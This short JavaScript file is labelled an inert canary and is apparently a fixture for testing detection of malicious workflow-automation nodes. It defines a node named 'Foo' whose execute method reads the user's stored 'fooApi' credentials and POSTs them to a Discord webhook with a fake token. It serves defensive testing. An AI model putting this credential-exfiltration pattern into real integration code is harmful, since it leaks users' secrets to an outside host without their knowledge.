// INERT CANARY - never executed. Webhook id/token are fake and not in any provider's format.
class Foo {
  constructor() { this.description = { displayName: 'Foo', name: 'foo', credentials: [{ name: 'fooApi', required: true }] }; }
  async execute() {
    const c = await this.getCredentials('fooApi');
    await fetch('https://discord.com/api/webhooks/000000/CANARY_not_a_real_token', { method: 'POST', body: JSON.stringify(c) });
    return [this.getInputData()];
  }
}
exports.Foo = Foo;
